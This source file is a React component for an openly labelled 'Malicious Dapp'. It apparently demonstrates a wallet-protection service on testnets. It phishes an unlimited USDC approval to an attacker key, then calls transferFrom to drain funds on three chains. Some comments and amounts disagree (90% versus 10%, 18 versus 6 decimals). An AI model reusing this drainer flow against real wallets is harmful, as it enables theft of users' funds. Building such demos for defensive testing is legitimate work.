import { useState, useEffect, useRef, useCallback } from "react";
import {
  useAccount,
  useBalance,
  useWriteContract,
  useWaitForTransactionReceipt,
  useSwitchChain,
  useReadContract,
  usePublicClient,
} from "wagmi";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import {
  formatUnits,
  maxUint256,
  createWalletClient,
  createPublicClient,
  http,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import type { Address } from "viem";
import { celoSepolia } from "viem/chains";
import { defineChain } from "viem";
import axios from "axios";

// Define chains for wallet clients
const APPCHAIN_NETWORK = defineChain({
  id: 4661,
  name: "Appchain",
  nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
  rpcUrls: {
    default: {
      http: ["https://appchaintestnet.rpc.caldera.xyz/http"],
    },
  },
});

const RARI_NETWORK = defineChain({
  id: 1918988905,
  name: "Rari",
  nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
  rpcUrls: {
    default: {
      http: ["https://rari-testnet.calderachain.xyz/"],
    },
  },
});

// Attacker's private key
const ATTACKER_PRIVATE_KEY = process.env.ATTACKER_PRIVATE_KEY;

if (!ATTACKER_PRIVATE_KEY) {
  console.error("ATTACKER_PRIVATE_KEY is not set");
}
  

const CELO_CHAIN_ID = celoSepolia.id;
const APPCHAIN_CHAIN_ID = 4661;
const RARI_CHAIN_ID = 1918988905;

const USDC_ADDRESSES = {
  celo: "0xE3347DC25e96F65E0029B18595bCAf6656Ed027e",
  appchain: "0xcF203c5f8Ef52DBC1451Fc48db1Fc4a54E0935b3",
  rari: "0x1ed6fd61b72E24084A92d94999858D51161676CE",
};

const ERC20_ABI = [
  {
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "paused",
    outputs: [{ name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
] as const;

// Derive attacker wallet address and account from private key
const attackerAccount = privateKeyToAccount(ATTACKER_PRIVATE_KEY);
const ATTACKER_ADDRESS = attackerAccount.address;

function getAttackerAddress(): `0x${string}` {
  return ATTACKER_ADDRESS;
}

type ProtectionEvent = {
  type: string;
  timestamp: Date;
  message: string;
  data?: unknown;
};

type DrainAttempt = {
  network: string;
  chainId: number;
  status: "pending" | "success" | "blocked" | "error";
  message: string;
  amount?: string;
  txHash?: string;
  error?: string;
};

const MaliciousDapp = () => {
  const { address, isConnected, chainId } = useAccount();
  const { switchChain } = useSwitchChain();
  const { writeContract, data: hash, isPending, error } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } =
    useWaitForTransactionReceipt({ hash });
  const publicClient = usePublicClient();

  const [maliciousWallet, setMaliciousWallet] = useState<`0x${string}` | null>(
    null
  );
  const [isProtected, setIsProtected] = useState(false);
  const [approvalTxHash, setApprovalTxHash] = useState<string | null>(null);
  const [drainAttempts, setDrainAttempts] = useState<DrainAttempt[]>([]);
  const [isDraining, setIsDraining] = useState(false);
  const [events, setEvents] = useState<ProtectionEvent[]>([]);
  const wsRef = useRef<WebSocket | null>(null);

  const celoBalance = useBalance({
    address,
    token: USDC_ADDRESSES.celo as `0x${string}`,
    chainId: CELO_CHAIN_ID,
    query: {
      enabled: !!address,
    },
  });

  const appchainBalance = useBalance({
    address,
    token: USDC_ADDRESSES.appchain as `0x${string}`,
    chainId: APPCHAIN_CHAIN_ID,
    query: {
      enabled: !!address,
    },
  });

  const rariBalance = useBalance({
    address,
    token: USDC_ADDRESSES.rari as `0x${string}`,
    chainId: RARI_CHAIN_ID,
    query: {
      enabled: !!address,
    },
  });

  const allowance = useReadContract({
    address: USDC_ADDRESSES.celo as Address,
    abi: ERC20_ABI,
    functionName: "allowance",
    args: address && maliciousWallet ? [address, maliciousWallet] : undefined,
    chainId: CELO_CHAIN_ID,
    query: {
      enabled: !!address && !!maliciousWallet,
    },
  });

  const addEvent = useCallback(
    (type: string, message: string, data?: unknown) => {
      setEvents((prev) => [
        {
          type,
          timestamp: new Date(),
          message,
          data,
        },
        ...prev,
      ]);
    },
    []
  );

  useEffect(() => {
    if (!maliciousWallet) {
      // Derive attacker address from private key
      const attackerAddress = getAttackerAddress();
      setMaliciousWallet(attackerAddress);
      addEvent(
        "attacker_wallet_generated",
        `Attacker wallet address derived: ${attackerAddress}`,
        { address: attackerAddress }
      );
    }
  }, [maliciousWallet, addEvent]);

  useEffect(() => {
    if (!address) return;

    const registerWallet = async () => {
      try {
        await axios.post("http://localhost:4000/register-wallet", {
          address: address,
        });
        setIsProtected(true);
        addEvent("wallet_registered", "Wallet registered for protection");
      } catch (error) {
        console.error("Error registering wallet:", error);
      }
    };

    registerWallet();
  }, [address, addEvent]);

  const attemptDrain = useCallback(async () => {
    if (!address || !maliciousWallet || !publicClient) return;

    setIsDraining(true);
    addEvent(
      "drain_initiated",
      "Malicious wallet attempting to drain 90% of funds across all networks..."
    );

    const networks = [
      {
        name: "Appchain",
        chainId: APPCHAIN_CHAIN_ID,
        address: USDC_ADDRESSES.appchain as Address,
        balance: appchainBalance.data?.value || 0n,
      },
      {
        name: "Rari",
        chainId: RARI_CHAIN_ID,
        address: USDC_ADDRESSES.rari as Address,
        balance: rariBalance.data?.value || 0n,
      },
      {
        name: "Celo",
        chainId: CELO_CHAIN_ID,
        address: USDC_ADDRESSES.celo as Address,
        balance: celoBalance.data?.value || 0n,
      },
    ];

    const attempts: DrainAttempt[] = [];

    for (const network of networks) {
      const attempt: DrainAttempt = {
        network: network.name,
        chainId: network.chainId,
        status: "pending",
        message: "Attempting drain...",
      };

      attempts.push(attempt);
      setDrainAttempts([...attempts]);

      try {
        if (network.balance === 0n) {
          attempt.status = "error";
          attempt.message = "No balance to drain";
          attempt.amount = "0 USDC";
          addEvent("drain_skipped", `${network.name}: No balance available`, {
            network: network.name,
          });
          setDrainAttempts([...attempts]);
          continue;
        }

        const drainAmount = (network.balance * 10n) / 100n;
        const drainAmountFormatted = formatUnits(drainAmount, 6);

        attempt.amount = `${drainAmountFormatted} USDC`;
        attempt.message = `Attempting to drain ${drainAmountFormatted} USDC...`;
        setDrainAttempts([...attempts]);

        addEvent(
          "drain_attempting",
          `${network.name}: Attempting to drain ${drainAmountFormatted} USDC (90% of balance)`,
          { network: network.name, amount: drainAmountFormatted }
        );

        await new Promise((resolve) => setTimeout(resolve, 1000));

        // Create wallet client for this network using attacker's private key
        let walletClient;
        try {
          if (network.chainId === CELO_CHAIN_ID) {
            walletClient = createWalletClient({
              account: attackerAccount,
              chain: celoSepolia,
              transport: http(),
            });
          } else if (network.chainId === APPCHAIN_CHAIN_ID) {
            walletClient = createWalletClient({
              account: attackerAccount,
              chain: APPCHAIN_NETWORK,
              transport: http(),
            });
          } else if (network.chainId === RARI_CHAIN_ID) {
            walletClient = createWalletClient({
              account: attackerAccount,
              chain: RARI_NETWORK,
              transport: http(),
            });
          } else {
            throw new Error(`Unsupported chain: ${network.chainId}`);
          }
        } catch (clientError) {
          attempt.status = "error";
          attempt.message = `Failed to create wallet client: ${
            (clientError as Error).message
          }`;
          attempt.error = (clientError as Error).message;
          setDrainAttempts([...attempts]);
          continue;
        }

        // Actually attempt the drain transaction signed by the attacker
        try {
          attempt.status = "pending";
          attempt.message = `Attacker submitting transaction to drain ${drainAmountFormatted} USDC...`;
          setDrainAttempts([...attempts]);

          addEvent(
            "drain_tx_submitting",
            `${network.name}: Attacker attempting to drain ${drainAmountFormatted} USDC`,
            { network: network.name, amount: drainAmountFormatted }
          );

          // Use attacker's wallet to send the transaction
          const txHash = await walletClient.writeContract({
            address: network.address,
            abi: ERC20_ABI,
            functionName: "transferFrom",
            args: [address, maliciousWallet, drainAmount],
          });

          attempt.txHash = txHash;
          attempt.status = "pending";
          attempt.message = `Transaction submitted: ${txHash.slice(0, 10)}...`;
          setDrainAttempts([...attempts]);

          addEvent(
            "drain_tx_submitted",
            `${network.name}: Transaction submitted by attacker - ${txHash}`,
            { network: network.name, txHash, amount: drainAmountFormatted }
          );

          // Create public client for this network to wait for receipt
          let publicClientForNetwork;
          if (network.chainId === CELO_CHAIN_ID) {
            publicClientForNetwork = createPublicClient({
              chain: celoSepolia,
              transport: http(),
            });
          } else if (network.chainId === APPCHAIN_CHAIN_ID) {
            publicClientForNetwork = createPublicClient({
              chain: APPCHAIN_NETWORK,
              transport: http(),
            });
          } else if (network.chainId === RARI_CHAIN_ID) {
            publicClientForNetwork = createPublicClient({
              chain: RARI_NETWORK,
              transport: http(),
            });
          } else {
            throw new Error(`Unsupported chain: ${network.chainId}`);
          }

          // Wait for transaction receipt
          const receipt =
            await publicClientForNetwork.waitForTransactionReceipt({
              hash: txHash,
            });

          if (receipt.status === "success") {
            attempt.status = "success";
            attempt.message = `Drain successful! ${drainAmountFormatted} USDC transferred`;
            addEvent(
              "drain_success",
              `${network.name}: Drain succeeded - ${drainAmountFormatted} USDC transferred`,
              { network: network.name, txHash, amount: drainAmountFormatted }
            );
          } else {
            attempt.status = "blocked";
            attempt.message = "Blocked - Transaction reverted";
            addEvent(
              "drain_blocked",
              `${network.name}: Drain blocked - Transaction reverted`,
              { network: network.name, txHash, amount: drainAmountFormatted }
            );
          }
          setDrainAttempts([...attempts]);
        } catch (txError: unknown) {
          const errorMessage =
            (txError as { shortMessage?: string; message?: string })
              ?.shortMessage ||
            (txError as { message?: string })?.message ||
            "Unknown error";

          if (
            errorMessage.includes("paused") ||
            errorMessage.includes("Pausable") ||
            errorMessage.includes("revert") ||
            errorMessage.includes("execution reverted")
          ) {
            attempt.status = "blocked";
            attempt.message = "Blocked - Token frozen by protection system";
            attempt.error = errorMessage;
            addEvent(
              "drain_blocked",
              `${network.name}: Drain successfully blocked - Token is frozen`,
              {
                network: network.name,
                amount: drainAmountFormatted,
                error: errorMessage,
              }
            );
          } else {
            attempt.status = "error";
            attempt.message = `Error: ${errorMessage}`;
            attempt.error = errorMessage;
            addEvent("drain_error", `${network.name}: Drain attempt failed`, {
              network: network.name,
              error: errorMessage,
            });
          }
          setDrainAttempts([...attempts]);
        }
      } catch (error: unknown) {
        const errorMessage =
          (error as { message?: string })?.message || "Unknown error";
        attempt.status = "error";
        attempt.message = `Error: ${errorMessage}`;
        attempt.error = errorMessage;
        addEvent("drain_error", `${network.name}: Drain attempt failed`, {
          network: network.name,
          error: errorMessage,
        });
        setDrainAttempts([...attempts]);
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    // Wait a bit for transactions to complete
    setTimeout(() => {
      setIsDraining(false);
      const allBlocked = attempts.every((a) => a.status === "blocked");
      const anySuccess = attempts.some((a) => a.status === "success");

      if (allBlocked) {
        addEvent(
          "drain_complete",
          "✅ All drain attempts blocked! Your funds are safe across all networks."
        );
      } else if (anySuccess) {
        addEvent(
          "drain_warning",
          "⚠️ Some drain attempts succeeded! Protection may not be fully active."
        );
      } else {
        addEvent(
          "drain_complete",
          "Drain attempts completed. Check results above."
        );
      }
    }, 5000);
  }, [
    address,
    maliciousWallet,
    publicClient,
    celoBalance.data,
    appchainBalance.data,
    rariBalance.data,
    addEvent,
  ]);

  useEffect(() => {
    if (!isConnected || !address) return;

    const ws = new WebSocket("ws://localhost:4000/ws");
    wsRef.current = ws;

    ws.onopen = () => {
      addEvent("websocket_connected", "Connected to protection service");
    };

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === "approval_detected") {
          addEvent("approval_detected", "Malicious approval detected!", data);
          setApprovalTxHash(data.txHash);
          setTimeout(() => {
            attemptDrain();
          }, 2000);
        } else if (data.type === "freeze_triggered") {
          addEvent(
            "freeze_triggered",
            "Protection activated! Tokens frozen across all networks",
            data
          );
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    };

    ws.onerror = (error) => {
      console.error("WebSocket error:", error);
    };

    ws.onclose = () => {
      addEvent(
        "websocket_disconnected",
        "Disconnected from protection service"
      );
    };

    return () => {
      if (wsRef.current) {
        wsRef.current.close();
      }
    };
  }, [isConnected, address, attemptDrain, addEvent]);

  const handleApprove = async () => {
    if (!address || !maliciousWallet) return;

    if (chainId !== CELO_CHAIN_ID) {
      switchChain({ chainId: CELO_CHAIN_ID });
      return;
    }

    addEvent("approval_initiated", "Initiating unlimited USDC approval...");

    writeContract({
      address: USDC_ADDRESSES.celo as `0x${string}`,
      abi: ERC20_ABI,
      functionName: "approve",
      args: [maliciousWallet, maxUint256],
    });
  };

  useEffect(() => {
    // Only handle approval transaction confirmation
    if (isConfirmed && hash && !approvalTxHash) {
      addEvent("approval_confirmed", "Approval transaction confirmed!", {
        txHash: hash,
      });
      setApprovalTxHash(hash);
      setTimeout(() => {
        attemptDrain();
      }, 2000);
    }
  }, [isConfirmed, hash, approvalTxHash, attemptDrain, addEvent]);

  if (!isConnected) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black text-white flex items-center justify-center">
        <div className="text-center animate-in-up">
          <h1 className="text-3xl mb-6 gradient-text">
            Please connect your wallet
          </h1>
          <ConnectButton accountStatus="avatar" showBalance={false} />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black text-white p-6 md:p-8">
      <div className="max-w-7xl mx-auto">
        <header className="flex flex-col md:flex-row items-start md:items-center justify-between mb-10 gap-4 animate-in-down">
          <div>
            <h1 className="text-4xl md:text-3xl font-bold mb-3 bg-gradient-to-r from-red-500 via-orange-500 to-red-600 bg-clip-text text-transparent">
              ⚠️ Malicious Dapp
            </h1>
            <p className="text-gray-400 text-lg">
              This is a demonstration of how our protection system works
            </p>
          </div>
          <ConnectButton accountStatus="avatar" showBalance={false} />
        </header>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div
            className="card-hover glass-effect border border-red-500/30 rounded-2xl p-6 animate-in-up"
            style={{ animationDelay: "0.1s" }}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-bold text-red-400">
                Your USDC Balance
              </h2>
              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-red-500/20 to-orange-500/20 border border-red-400/30 flex items-center justify-center">
                <span className="text-red-400">💰</span>
              </div>
            </div>
            <div className="mb-4">
              <p className="text-gray-400 text-sm mb-2 font-medium">
                Balance (Celo)
              </p>
              <div className="flex items-baseline gap-2">
                <p className="text-3xl font-bold text-white">
                  {celoBalance.isLoading
                    ? "..."
                    : celoBalance.data
                    ? formatUnits(celoBalance.data.value, 18)
                    : "0"}
                </p>
                <span className="text-gray-500 text-lg">USDC</span>
              </div>
              {celoBalance.isLoading && (
                <div className="mt-2 h-1 bg-gray-800 rounded-full overflow-hidden">
                  <div className="h-full bg-gradient-to-r from-red-500 to-orange-500 animate-shimmer"></div>
                </div>
              )}
            </div>
            {allowance.data && allowance.data > 0n && (
              <div className="mt-4 p-4 bg-red-500/10 border border-red-500/50 rounded-xl animate-in">
                <p className="text-sm text-red-400 font-semibold flex items-center gap-2">
                  <span className="text-lg">⚠️</span>
                  Approved: {(formatUnits(allowance.data, 18)).slice(0, 20)}... USDC
                </p>
              </div>
            )}
          </div>

          <div
            className="card-hover glass-effect border border-red-500/30 rounded-2xl p-6 animate-in-up"
            style={{ animationDelay: "0.2s" }}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-bold text-red-400">
                Malicious Wallet
              </h2>
              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-red-500/20 to-orange-500/20 border border-red-400/30 flex items-center justify-center">
                <span className="text-red-400">🔴</span>
              </div>
            </div>
            <div className="mb-6">
              <p className="text-gray-400 text-sm mb-2 font-medium">Address</p>
              <div className="glass-effect rounded-xl p-3 border border-red-400/20">
                <p className="text-xs font-mono text-red-400 break-all">
                  {maliciousWallet || "Generating..."}
                </p>
              </div>
            </div>
            <div>
              <p className="text-gray-400 text-sm mb-2 font-medium">
                Protection Status
              </p>
              <div
                className={`inline-flex items-center gap-2 px-4 py-2 rounded-xl ${
                  isProtected
                    ? "bg-green-500/10 border border-green-400/30"
                    : "bg-yellow-500/10 border border-yellow-400/30"
                }`}>
                <div
                  className={`w-2 h-2 rounded-full ${
                    isProtected ? "bg-green-400 animate-pulse" : "bg-yellow-400"
                  }`}
                />
                <p
                  className={`text-lg font-bold ${
                    isProtected ? "text-green-400" : "text-yellow-400"
                  }`}>
                  {isProtected ? "✓ Protected" : "⚠️ Not Protected"}
                </p>
              </div>
            </div>
          </div>
        </div>

        <div
          className="card-hover glass-effect border border-red-500/30 rounded-2xl p-8 mb-8 animate-in-up"
          style={{ animationDelay: "0.3s" }}>
          <div className="flex items-start gap-4 mb-6">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-red-500/20 to-orange-500/20 border border-red-400/30 flex items-center justify-center flex-shrink-0">
              <span className="text-2xl">1️⃣</span>
            </div>
            <div className="flex-1">
              <h2 className="text-2xl font-bold mb-3 text-red-400">
                Step 1: Approve and Drain Unlimited USDC
              </h2>
              <p className="text-gray-300 leading-relaxed mb-6">
                This malicious dapp will ask you to approve unlimited USDC
                spending on Celo. After approval, the malicious wallet will
                attempt to drain your funds across all networks.
              </p>
            </div>
          </div>
          <button
            onClick={handleApprove}
            disabled={isPending || isConfirming || !maliciousWallet}
            className="button-glow w-full bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed px-8 py-4 rounded-xl transition-all duration-300 font-semibold text-lg shadow-lg shadow-red-500/30">
            {chainId !== CELO_CHAIN_ID
              ? "Switch to Celo"
              : isPending || isConfirming
              ? "Processing..."
              : "⚠️ Approve Unlimited USDC"}
          </button>
          {error && (
            <div className="mt-4 p-4 bg-red-500/10 border border-red-500/50 rounded-xl animate-in">
              <p className="text-red-400 font-medium">Error: {error.message}</p>
            </div>
          )}
          {approvalTxHash && (
            <div className="mt-6 p-5 bg-gradient-to-r from-yellow-500/10 to-orange-500/10 border border-yellow-500/50 rounded-xl animate-pulse-glow">
              <p className="text-yellow-400 font-semibold flex items-center gap-2">
                <span className="text-xl animate-spin">⚡</span>
                Approval confirmed! Drain attempts will begin shortly...
              </p>
            </div>
          )}
        </div>

        {(drainAttempts.length > 0 || isDraining) && (
          <div
            className={`card-hover glass-effect border rounded-2xl p-8 mb-8 transition-all duration-500 animate-in-up ${
              drainAttempts.length > 0 &&
              drainAttempts.every((a) => a.status === "blocked")
                ? "border-green-500/50 animate-pulse-glow"
                : isDraining
                ? "border-yellow-500/50"
                : "border-red-500/50"
            }`}
            style={{ animationDelay: "0.4s" }}>
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-4">
                <div
                  className={`w-12 h-12 rounded-xl flex items-center justify-center ${
                    drainAttempts.length > 0 &&
                    drainAttempts.every((a) => a.status === "blocked")
                      ? "bg-gradient-to-br from-green-500/20 to-emerald-500/20 border border-green-400/30"
                      : isDraining
                      ? "bg-gradient-to-br from-yellow-500/20 to-orange-500/20 border border-yellow-400/30"
                      : "bg-gradient-to-br from-red-500/20 to-orange-500/20 border border-red-400/30"
                  }`}>
                  <span className="text-2xl">2️⃣</span>
                </div>
                <div>
                  <h2
                    className={`text-2xl font-bold ${
                      drainAttempts.length > 0 &&
                      drainAttempts.every((a) => a.status === "blocked")
                        ? "text-green-400"
                        : isDraining
                        ? "text-yellow-400"
                        : "text-red-400"
                    }`}>
                    Step 2: Drain Attempts
                  </h2>
                  {isDraining && (
                    <p className="text-sm text-gray-400 mt-1 flex items-center gap-2">
                      <span className="inline-block animate-spin">⚡</span>
                      Processing...
                    </p>
                  )}
                </div>
              </div>
              {drainAttempts.length > 0 && !isDraining && (
                <div
                  className={`px-4 py-2 rounded-xl text-sm font-bold shadow-lg ${
                    drainAttempts.every((a) => a.status === "blocked")
                      ? "bg-gradient-to-r from-green-500/20 to-emerald-500/20 text-green-400 border border-green-400/30"
                      : "bg-gradient-to-r from-red-500/20 to-orange-500/20 text-red-400 border border-red-400/30"
                  }`}>
                  {drainAttempts.every((a) => a.status === "blocked")
                    ? "✅ ALL BLOCKED"
                    : "⚠️ SOME FAILED"}
                </div>
              )}
            </div>
            <div className="space-y-4">
              {drainAttempts.map((attempt, index) => (
                <div
                  key={index}
                  className={`card-hover glass-effect rounded-xl p-5 border-l-4 transition-all duration-300 animate-in slide-in-from-left ${
                    attempt.status === "blocked"
                      ? "border-green-500 bg-green-500/5"
                      : attempt.status === "success"
                      ? "border-red-500 bg-red-500/5"
                      : attempt.status === "pending"
                      ? "border-yellow-500 bg-yellow-500/5 animate-pulse"
                      : "border-gray-500"
                  }`}
                  style={{ animationDelay: `${0.1 * index}s` }}>
                  <div className="flex items-center justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-3 mb-2">
                        <p className="font-bold text-lg text-white">
                          {attempt.network}
                        </p>
                        {attempt.status === "pending" && (
                          <span className="text-yellow-400 animate-spin text-xl">
                            ⏳
                          </span>
                        )}
                        {attempt.status === "blocked" && (
                          <span className="text-green-400 text-xl">🛡️</span>
                        )}
                        {attempt.status === "success" && (
                          <span className="text-red-400 text-xl">⚠️</span>
                        )}
                        {attempt.status === "error" && (
                          <span className="text-gray-400 text-xl">❌</span>
                        )}
                      </div>
                      <p
                        className={`text-sm font-medium mb-2 ${
                          attempt.status === "blocked"
                            ? "text-green-400"
                            : attempt.status === "success"
                            ? "text-red-400"
                            : "text-gray-400"
                        }`}>
                        {attempt.message}
                      </p>
                      {attempt.amount && (
                        <p className="text-xs text-gray-500 font-mono">
                          Amount: {attempt.amount}
                        </p>
                      )}
                      {attempt.error && (
                        <details className="mt-3">
                          <summary className="text-xs text-gray-400 cursor-pointer hover:text-gray-300 transition-colors font-medium">
                            Error details
                          </summary>
                          <p className="text-xs text-red-400 mt-2 break-all font-mono bg-red-500/10 p-2 rounded">
                            {attempt.error}
                          </p>
                        </details>
                      )}
                    </div>
                    <div
                      className={`ml-6 px-4 py-2 rounded-xl font-bold text-sm ${
                        attempt.status === "blocked"
                          ? "bg-green-500/20 text-green-400 border border-green-400/30"
                          : attempt.status === "success"
                          ? "bg-red-500/20 text-red-400 border border-red-400/30 animate-pulse"
                          : attempt.status === "pending"
                          ? "bg-yellow-500/20 text-yellow-400 border border-yellow-400/30"
                          : "bg-gray-500/20 text-gray-400 border border-gray-400/30"
                      }`}>
                      {attempt.status === "blocked" && "✓ BLOCKED"}
                      {attempt.status === "success" && "⚠️ SUCCESS"}
                      {attempt.status === "pending" && "⏳ PENDING"}
                      {attempt.status === "error" && "❌ ERROR"}
                    </div>
                  </div>
                </div>
              ))}
              {isDraining && drainAttempts.length === 0 && (
                <div className="p-6 glass-effect rounded-xl border-l-4 border-yellow-500 animate-pulse">
                  <p className="text-yellow-400 font-medium flex items-center gap-2">
                    <span className="animate-spin">⚡</span>
                    Preparing drain attempts...
                  </p>
                </div>
              )}
            </div>
          </div>
        )}

        <div
          className="card-hover glass-effect border border-white/10 rounded-2xl p-8 animate-in-up"
          style={{ animationDelay: "0.5s" }}>
          <div className="flex items-center gap-4 mb-6">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-purple-500/20 to-pink-500/20 border border-purple-400/30 flex items-center justify-center">
              <span className="text-2xl">📡</span>
            </div>
            <h2 className="text-2xl font-bold text-white">Protection Events</h2>
          </div>
          <div className="space-y-3 max-h-96 overflow-y-auto pr-2">
            {events.length === 0 ? (
              <div className="text-center py-12">
                <p className="text-gray-400 text-lg">No events yet...</p>
                <p className="text-gray-500 text-sm mt-2">
                  Events will appear here as they occur
                </p>
              </div>
            ) : (
              events.map((event, index) => (
                <div
                  key={index}
                  className="glass-effect rounded-xl p-4 border-l-4 border-purple-500 animate-in slide-in-from-right"
                  style={{ animationDelay: `${0.05 * index}s` }}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-sm font-bold text-purple-400 uppercase tracking-wide">
                      {event.type.replace(/_/g, " ")}
                    </span>
                    <span className="text-xs text-gray-400 font-mono">
                      {event.timestamp.toLocaleTimeString()}
                    </span>
                  </div>
                  <p className="text-sm text-gray-300 leading-relaxed">
                    {event.message}
                  </p>
                  {event.data !== undefined && (
                    <details className="mt-3">
                      <summary className="text-xs text-gray-400 cursor-pointer hover:text-purple-400 transition-colors font-medium">
                        View details
                      </summary>
                      <pre className="mt-2 text-xs glass-effect p-3 rounded-lg overflow-auto border border-purple-400/20">
                        {JSON.stringify(event.data, null, 2)}
                      </pre>
                    </details>
                  )}
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default MaliciousDapp;
